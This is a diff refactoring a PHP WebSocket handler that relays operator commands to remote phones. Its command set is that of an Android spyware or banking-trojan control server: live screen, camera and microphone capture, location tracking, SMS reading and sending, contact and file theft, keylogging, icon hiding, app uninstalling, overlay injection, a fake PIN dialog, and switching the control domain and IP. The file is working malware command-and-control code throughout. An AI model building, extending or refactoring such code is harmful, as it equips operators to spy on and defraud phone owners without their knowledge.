@@ -5,10 +5,14 @@ declare(strict_types=1);
 namespace App\WebSocket\Handlers;
 
 use App\WebSocket\ConnectionManager;
+use App\WebSocket\Handlers\Concerns\AuthorizesDeviceAccess;
+use App\WebSocket\Messages\WebSocketMessage;
 use App\WebSocket\WebSocketLog;
 
 final class PanelSendHandler
 {
+    use AuthorizesDeviceAccess;
+
     private ConnectionManager $connectionManager;
 
     public function __construct(ConnectionManager $connectionManager)
@@ -16,68 +20,55 @@ final class PanelSendHandler
         $this->connectionManager = $connectionManager;
     }
 
-    public function handle(int $fd, array $data): void
+    public function handle(int $fd, WebSocketMessage $message): void
     {
-        $phoneId = $data['pid'] ?? null;
-        $subc = $data['subc'] ?? null;
-
+        $phoneId = $this->authorizeDeviceAccess($fd, $message, $this->connectionManager);
         if ($phoneId === null) {
-            WebSocketLog::getLogger()->warning("PanelSend message missing pid: fd={$fd}");
-
             return;
         }
 
-        if (! $this->connectionManager->isPanelAuthorizedForDevice($fd, $phoneId)) {
-            WebSocketLog::getLogger()->warning("PanelSend unauthorized for device: fd={$fd}, pid={$phoneId}");
-            $this->connectionManager->send($fd, [
-                'type' => 'error',
-                'error' => 'Not authorized for this device',
-                'pid' => $phoneId,
-            ]);
-
-            return;
-        }
+        $subc = $message->subc();
 
         $this->logOperation('mov_check', $phoneId);
 
         match ($subc) {
-            'screen' => $this->handleScreen($phoneId, $data),
-            'cam', 'camoff' => $this->handleCamera($phoneId, $data),
-            'mic', 'micoff' => $this->handleMicrophone($phoneId, $data),
-            'loc', 'locoff' => $this->handleLocation($phoneId, $data),
-            'SMS' => $this->handleSms($phoneId, $data),
-            'SMSSEND' => $this->handleSmsSend($phoneId, $data),
+            'screen' => $this->handleScreen($phoneId, $message),
+            'cam', 'camoff' => $this->handleCamera($phoneId, $message),
+            'mic', 'micoff' => $this->handleMicrophone($phoneId, $message),
+            'loc', 'locoff' => $this->handleLocation($phoneId, $message),
+            'SMS' => $this->handleSms($phoneId),
+            'SMSSEND' => $this->handleSmsSend($phoneId, $message),
             'Contacts' => $this->handleContacts($phoneId),
-            'files' => $this->handleFiles($phoneId, $data),
-            'changefiles' => $this->handleChangeFiles($phoneId, $data),
-            'viewfile' => $this->handleViewFile($phoneId, $data),
-            'Keylog' => $this->handleKeylog($phoneId, $data),
-            'Logdate' => $this->handleLogdate($phoneId, $data),
+            'files' => $this->handleFiles($phoneId, $message),
+            'changefiles' => $this->handleChangeFiles($phoneId, $message),
+            'viewfile' => $this->handleViewFile($phoneId, $message),
+            'Keylog' => $this->handleKeylog($phoneId, $message),
+            'Logdate' => $this->handleLogdate($phoneId, $message),
             'LOADAPPS' => $this->handleLoadApps($phoneId),
-            'OPENAPP' => $this->handleOpenApp($phoneId, $data),
-            'UNINSTALLAPP' => $this->handleUninstallApp($phoneId, $data),
+            'OPENAPP' => $this->handleOpenApp($phoneId, $message),
+            'UNINSTALLAPP' => $this->handleUninstallApp($phoneId, $message),
             'Hideico' => $this->handleHideIcon($phoneId),
-            'activz', 'notifys', 'vapps', 'vlinks' => $this->handleActivityRecords($phoneId, $data),
-            'Permissions' => $this->handlePermissions($phoneId, $data),
-            'Notify' => $this->handleNotify($phoneId, $data),
-            'rename' => $this->handleRename($phoneId, $data),
-            'change' => $this->handleChange($phoneId, $data),
+            'activz', 'notifys', 'vapps', 'vlinks' => $this->handleActivityRecords($phoneId, $message),
+            'Permissions' => $this->handlePermissions($phoneId, $message),
+            'Notify' => $this->handleNotify($phoneId, $message),
+            'rename' => $this->handleRename($phoneId, $message),
+            'change' => $this->handleChange($phoneId, $message),
             'delete' => $this->handleDelete($phoneId),
-            'DIAO' => $this->handleDialog($phoneId, $data),
+            'DIAO' => $this->handleDialog($phoneId, $message),
             'OPENINJ' => $this->handleOpenInject($phoneId),
-            'noinj' => $this->handleNoInject($phoneId, $data),
-            'display' => $this->handleDisplay($phoneId, $data),
+            'noinj' => $this->handleNoInject($phoneId, $message),
+            'display' => $this->handleDisplay($phoneId, $message),
             'getinject' => $this->handleGetInject($phoneId),
             'getgallery' => $this->handleGetGallery($phoneId),
-            default => $this->forwardToDevice($phoneId, $data),
+            default => $this->forwardToDevice($phoneId, $message),
         };
     }
 
-    private function handleScreen(string $phoneId, array $data): void
+    private function handleScreen(string $phoneId, WebSocketMessage $message): void
     {
         // 投屏命令格式（参考 Node.js 原始实现）:
         // type=screencomd, subc=Screen (大写S), comdtype=SM/SN/SK/SMOFF/SNOFF/SKOFF
-        $screentype = $data['screentype'] ?? '';
+        $screentype = $message->getString('screentype');
 
         $this->connectionManager->sendToDevice($phoneId, [
             'type' => 'screencomd',
@@ -86,18 +77,18 @@ final class PanelSendHandler
         ]);
     }
 
-    private function handleCamera(string $phoneId, array $data): void
+    private function handleCamera(string $phoneId, WebSocketMessage $message): void
     {
         // 相机命令格式（参考 Node.js 原始实现）:
         // cam → type=screencomd, subc=Camera, SelectedCam
         // camoff → type=screencomd, subc=CameraOff
-        $subc = $data['subc'];
+        $subc = $message->subc();
 
         if ($subc === 'cam') {
             $this->connectionManager->sendToDevice($phoneId, [
                 'type' => 'screencomd',
                 'subc' => 'Camera',
-                'SelectedCam' => $data['SelectedCam'] ?? '',
+                'SelectedCam' => $message->getString('SelectedCam'),
             ]);
         } else {
             $this->connectionManager->sendToDevice($phoneId, [
@@ -107,31 +98,31 @@ final class PanelSendHandler
         }
     }
 
-    private function handleMicrophone(string $phoneId, array $data): void
+    private function handleMicrophone(string $phoneId, WebSocketMessage $message): void
     {
         // 麦克风命令格式（参考 Node.js 原始实现）:
         // mic → type=mic, subc=ON
         // micoff → type=mic, subc=OFF
-        $subc = $data['subc'];
+        $subc = $message->subc();
         $this->connectionManager->sendToDevice($phoneId, [
             'type' => 'mic',
-            'subc' => $subc === 'mic' ? 'ON' : 'OFF',
+            'subc' => $this->microphoneCommandLabel($subc),
         ]);
     }
 
-    private function handleLocation(string $phoneId, array $data): void
+    private function handleLocation(string $phoneId, WebSocketMessage $message): void
     {
         // 定位命令格式（参考 Node.js 原始实现）:
         // loc → type=screencomd, subc=Location
         // locoff → type=screencomd, subc=Locationoff
-        $subc = $data['subc'];
+        $subc = $message->subc();
         $this->connectionManager->sendToDevice($phoneId, [
             'type' => 'screencomd',
-            'subc' => $subc === 'loc' ? 'Location' : 'Locationoff',
+            'subc' => $this->locationCommandLabel($subc),
         ]);
     }
 
-    private function handleSms(string $phoneId, array $data): void
+    private function handleSms(string $phoneId): void
     {
         $this->connectionManager->sendToDevice($phoneId, [
             'type' => 'screencomd',
@@ -139,13 +130,13 @@ final class PanelSendHandler
         ]);
     }
 
-    private function handleSmsSend(string $phoneId, array $data): void
+    private function handleSmsSend(string $phoneId, WebSocketMessage $message): void
     {
         $this->connectionManager->sendToDevice($phoneId, [
             'type' => 'screencomd',
             'subc' => 'SMSSEND',
-            'smsnumber' => $data['smsnumber'] ?? '',
-            'message' => $data['message'] ?? '',
+            'smsnumber' => $message->getString('smsnumber'),
+            'message' => $message->getString('message'),
         ]);
     }
 
@@ -157,45 +148,22 @@ final class PanelSendHandler
         ]);
     }
 
-    private function handleFiles(string $phoneId, array $data): void
+    private function handleFiles(string $phoneId, WebSocketMessage $message): void
     {
         $this->connectionManager->sendToDevice($phoneId, [
             'type' => 'screencomd',
             'subc' => 'files',
-            'filepath' => $data['filepath'] ?? '',
+            'filepath' => $message->getString('filepath'),
         ]);
     }
 
-    private function handleChangeFiles(string $phoneId, array $data): void
+    private function handleChangeFiles(string $phoneId, WebSocketMessage $message): void
     {
-        $comdtype = $data['comdtype'] ?? '';
+        $comdtype = $message->getString('comdtype');
 
         // Upload (U) requires chunking - split into 256KB chunks as per Node.js
         if ($comdtype === 'U') {
-            $chunkSize = 256 * 1024; // 256KB per chunk
-            $content = $data['content'] ?? '';
-            $totalSize = strlen($content);
-            $totalChunks = $totalSize > 0 ? (int) ceil($totalSize / $chunkSize) : 1;
-
-            for ($index = 0; $index < $totalChunks; $index++) {
-                $offset = $index * $chunkSize;
-                $chunk = substr($content, $offset, $chunkSize);
-
-                $this->connectionManager->sendToDevice($phoneId, [
-                    'type' => 'screencomd',
-                    'subc' => 'changefiles',
-                    'comdtype' => $comdtype,
-                    'isinjct' => $data['isinjct'] ?? '',
-                    'jctid' => $data['jctid'] ?? '',
-                    'filepath' => $data['filepath'] ?? '',
-                    'filetype' => $data['filetype'] ?? '',
-                    'filename' => $data['filename'] ?? '',
-                    'size' => $data['size'] ?? '',
-                    'chunkIndex' => $index,
-                    'totalChunks' => $totalChunks,
-                    'content' => $chunk,
-                ]);
-            }
+            $this->sendFileInChunks($phoneId, $message, $message->getString('content'));
 
             return;
         }
@@ -205,43 +173,73 @@ final class PanelSendHandler
             'type' => 'screencomd',
             'subc' => 'changefiles',
             'comdtype' => $comdtype,
-            'filepath' => $data['filepath'] ?? '',
-            'filetype' => $data['filetype'] ?? '',
-            'filename' => $data['filename'] ?? '',
-            'size' => $data['size'] ?? '',
-            'content' => $data['content'] ?? '',
+            'filepath' => $message->getString('filepath'),
+            'filetype' => $message->getString('filetype'),
+            'filename' => $message->getString('filename'),
+            'size' => $message->getString('size'),
+            'content' => $message->getString('content'),
         ]);
     }
 
-    private function handleViewFile(string $phoneId, array $data): void
+    private function sendFileInChunks(string $phoneId, WebSocketMessage $message, string $content): void
+    {
+        $chunkSize = 256 * 1024; // 256KB per chunk
+        $totalSize = strlen($content);
+        $totalChunks = $totalSize > 0 ? (int) ceil($totalSize / $chunkSize) : 1;
+
+        for ($index = 0; $index < $totalChunks; $index++) {
+            $chunk = substr($content, $index * $chunkSize, $chunkSize);
+            $this->connectionManager->sendToDevice($phoneId, $this->buildFileChunkPayload($message, $chunk, $index, $totalChunks));
+        }
+    }
+
+    private function buildFileChunkPayload(WebSocketMessage $message, string $chunk, int $index, int $totalChunks): array
+    {
+        return [
+            'type' => 'screencomd',
+            'subc' => 'changefiles',
+            'comdtype' => $message->getString('comdtype'),
+            'isinjct' => $message->getString('isinjct'),
+            'jctid' => $message->getString('jctid'),
+            'filepath' => $message->getString('filepath'),
+            'filetype' => $message->getString('filetype'),
+            'filename' => $message->getString('filename'),
+            'size' => $message->getString('size'),
+            'chunkIndex' => $index,
+            'totalChunks' => $totalChunks,
+            'content' => $chunk,
+        ];
+    }
+
+    private function handleViewFile(string $phoneId, WebSocketMessage $message): void
     {
         $this->connectionManager->sendToDevice($phoneId, [
             'type' => 'screencomd',
             'subc' => 'viewfile',
-            'filepath' => $data['filepath'] ?? '',
+            'filepath' => $message->getString('filepath'),
         ]);
     }
 
-    private function handleKeylog(string $phoneId, array $data): void
+    private function handleKeylog(string $phoneId, WebSocketMessage $message): void
     {
         // 键盘监听命令格式（参考 Node.js 原始实现）:
         // type=screencomd, subc=Keylog, comdtype=0(开启)/1(关闭)
         $this->connectionManager->sendToDevice($phoneId, [
             'type' => 'screencomd',
             'subc' => 'Keylog',
-            'comdtype' => $data['keylogtype'] ?? '',
+            'comdtype' => $message->getString('keylogtype'),
         ]);
     }
 
-    private function handleLogdate(string $phoneId, array $data): void
+    private function handleLogdate(string $phoneId, WebSocketMessage $message): void
     {
         // 键盘日志日期查询命令格式（参考 Node.js 原始实现）:
         // type=screencomd, subc=Logdate, comdtype, kdate
         $this->connectionManager->sendToDevice($phoneId, [
             'type' => 'screencomd',
             'subc' => 'Logdate',
-            'comdtype' => $data['keylogtype'] ?? '',
-            'kdate' => $data['keylogdate'] ?? '',
+            'comdtype' => $message->getString('keylogtype'),
+            'kdate' => $message->getString('keylogdate'),
         ]);
     }
 
@@ -253,25 +251,25 @@ final class PanelSendHandler
         ]);
     }
 
-    private function handleOpenApp(string $phoneId, array $data): void
+    private function handleOpenApp(string $phoneId, WebSocketMessage $message): void
     {
         // 打开应用命令格式（参考 Node.js 原始实现）:
         // type=screencomd, subc=OPENAPP, package (不是 packageName)
         $this->connectionManager->sendToDevice($phoneId, [
             'type' => 'screencomd',
             'subc' => 'OPENAPP',
-            'package' => $data['packageName'] ?? '',
+            'package' => $message->getString('packageName'),
         ]);
     }
 
-    private function handleUninstallApp(string $phoneId, array $data): void
+    private function handleUninstallApp(string $phoneId, WebSocketMessage $message): void
     {
         // 卸载应用命令格式（参考 Node.js 原始实现）:
         // type=screencomd, subc=UNINSTALLAPP, package (不是 packageName)
         $this->connectionManager->sendToDevice($phoneId, [
             'type' => 'screencomd',
             'subc' => 'UNINSTALLAPP',
-            'package' => $data['packageName'] ?? '',
+            'package' => $message->getString('packageName'),
         ]);
     }
 
@@ -283,11 +281,11 @@ final class PanelSendHandler
         ]);
     }
 
-    private function handleActivityRecords(string $phoneId, array $data): void
+    private function handleActivityRecords(string $phoneId, WebSocketMessage $message): void
     {
-        $commandType = $data['subc'] ?? '';
-        $action = $data['action'] ?? 'L';  // L=list/get, D=delete (from inner subc in Node.js)
-        $kdate = $data['kdate'] ?? '';
+        $commandType = $message->subc() ?? '';
+        $action = $message->getString('action', 'L');  // L=list/get, D=delete (from inner subc in Node.js)
+        $kdate = $message->getString('kdate');
 
         // Map command to Node.js protocol: type="Activitys", subc=GA/DA/GF/DF/GV/DV/GU/DU
         $subcMap = [
@@ -310,38 +308,38 @@ final class PanelSendHandler
         ]);
     }
 
-    private function handlePermissions(string $phoneId, array $data): void
+    private function handlePermissions(string $phoneId, WebSocketMessage $message): void
     {
-        $action = $data['action'] ?? '';
+        $action = $message->getString('action');
 
-        if ($action === 'R' && isset($data['prim'])) {
+        if ($action === 'R' && $message->has('prim')) {
             $this->connectionManager->sendToDevice($phoneId, [
                 'type' => 'Permissions',
                 'subc' => 'R',
-                'prim' => $data['prim'],
+                'prim' => $message->getString('prim'),
             ]);
         }
     }
 
-    private function handleRename(string $phoneId, array $data): void
+    private function handleRename(string $phoneId, WebSocketMessage $message): void
     {
         // 重命名命令格式（参考 Node.js 原始实现）:
         // type=screencomd, subc=Rename (大写R), name (不是 nam)
         $this->connectionManager->sendToDevice($phoneId, [
             'type' => 'screencomd',
             'subc' => 'Rename',
-            'name' => $data['nam'] ?? '',
+            'name' => $message->getString('nam'),
         ]);
     }
 
-    private function handleChange(string $phoneId, array $data): void
+    private function handleChange(string $phoneId, WebSocketMessage $message): void
     {
         $this->connectionManager->sendToDevice($phoneId, [
             'type' => 'screencomd',
             'subc' => 'change',
-            'domain' => $data['domain'] ?? '',
-            'ip' => $data['ip'] ?? '',
-            'changeid' => $data['changeid'] ?? '',
+            'domain' => $message->getString('domain'),
+            'ip' => $message->getString('ip'),
+            'changeid' => $message->getString('changeid'),
         ]);
     }
 
@@ -354,15 +352,15 @@ final class PanelSendHandler
         ]);
     }
 
-    private function handleDialog(string $phoneId, array $data): void
+    private function handleDialog(string $phoneId, WebSocketMessage $message): void
     {
         $this->connectionManager->sendToDevice($phoneId, [
             'type' => 'screencomd',
             'subc' => 'DIAO',
-            'pin' => $data['pin'] ?? '',
-            'title' => $data['title'] ?? '',
-            'lckdis' => $data['lckdis'] ?? '',
-            'typ' => $data['typ'] ?? '',
+            'pin' => $message->getString('pin'),
+            'title' => $message->getString('title'),
+            'lckdis' => $message->getString('lckdis'),
+            'typ' => $message->getString('typ'),
         ]);
     }
 
@@ -374,21 +372,21 @@ final class PanelSendHandler
         ]);
     }
 
-    private function handleNoInject(string $phoneId, array $data): void
+    private function handleNoInject(string $phoneId, WebSocketMessage $message): void
     {
         $this->connectionManager->sendToDevice($phoneId, [
             'type' => 'screencomd',
             'subc' => 'noinj',
-            'jctid' => $data['jctid'] ?? '',
+            'jctid' => $message->getString('jctid'),
         ]);
     }
 
-    private function handleDisplay(string $phoneId, array $data): void
+    private function handleDisplay(string $phoneId, WebSocketMessage $message): void
     {
         $this->connectionManager->sendToDevice($phoneId, [
             'type' => 'screencomd',
             'subc' => 'display',
-            'display' => $data['display'] ?? '',
+            'display' => $message->getString('display'),
         ]);
     }
 
@@ -410,18 +408,28 @@ final class PanelSendHandler
         ]);
     }
 
-    private function handleNotify(string $phoneId, array $data): void
+    private function handleNotify(string $phoneId, WebSocketMessage $message): void
     {
         // Node.js: type="Notifi", noti field
         $this->connectionManager->sendToDevice($phoneId, [
             'type' => 'Notifi',
-            'noti' => $data['noti'] ?? '',
+            'noti' => $message->getString('noti'),
         ]);
     }
 
-    private function forwardToDevice(string $phoneId, array $data): void
+    private function microphoneCommandLabel(string $subc): string
     {
-        $deviceData = array_merge($data, ['type' => 'screencomd']);
+        return $subc === 'mic' ? 'ON' : 'OFF';
+    }
+
+    private function locationCommandLabel(string $subc): string
+    {
+        return $subc === 'loc' ? 'Location' : 'Locationoff';
+    }
+
+    private function forwardToDevice(string $phoneId, WebSocketMessage $message): void
+    {
+        $deviceData = array_merge($message->toArray(), ['type' => 'screencomd']);
         unset($deviceData['itype'], $deviceData['pid']);
 
         $this->connectionManager->sendToDevice($phoneId, $deviceData);
